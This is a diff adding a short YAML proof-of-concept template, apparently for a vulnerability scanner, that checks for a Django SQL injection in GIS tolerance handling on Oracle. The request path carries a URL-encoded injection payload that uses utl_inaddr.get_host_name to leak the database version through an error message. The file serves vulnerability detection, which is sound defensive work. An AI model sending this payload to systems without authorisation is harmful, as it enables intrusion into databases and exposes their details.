@@ -1,0 +1,16 @@
+name: poc-yaml-djanjo-sqli-1
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /?q=20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20version%20FROM%20v%24instance))%20from%20dual)%20is%20null%20%20OR%20(1%2B1
+        expression: response.status == 200 && response.body.bcontains(bytes(b"DatabaseError at")) && response.body.bcontains(bytes(b"ORA-29257"))
+expression: r0()
+detail:
+    author: anyi(YiGeAnFuZai)
+    links:
+        - https://mp.weixin.qq.com/s/eXw8rE0iI625g8jdzeBkvw
+    Affected Version: Django 1.11 before 1.11.29, 2.2 before 2.2.11, and 3.0 before 3.0.4 allow SQL Injection if untrusted data is used as a tolerance parameter in GIS functions and aggregates on Oracle. By passing a suitably crafted tolerance to GIS functions and aggregates on Oracle, it is possible to break character escaping and inject malicious SQL.
